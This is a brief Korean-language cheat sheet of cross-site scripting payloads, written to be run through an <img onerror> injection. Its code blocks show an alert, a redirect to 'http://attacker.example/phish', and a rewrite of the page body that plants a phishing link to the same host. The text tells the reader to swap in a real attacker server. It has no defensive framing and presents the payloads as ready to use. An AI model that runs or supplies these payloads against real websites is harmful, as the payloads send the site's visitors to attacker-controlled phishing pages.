# XSS 클릭 유도 페이로드

## 개요

`<img src=x onerror="...">` 형태의 XSS에서 사용자를 특정 링크로 유도하는 JavaScript 페이로드 모음이다. `attacker.example`는 실제 공격자 서버 주소로 바꿔 사용한다.

## 링크 클릭 유도

```js
alert('클릭하세요')
```

```js
location.href='http://attacker.example/phish'
```

```js
document.body.innerHTML='<a href="http://attacker.example/phish">클릭</a>'
```
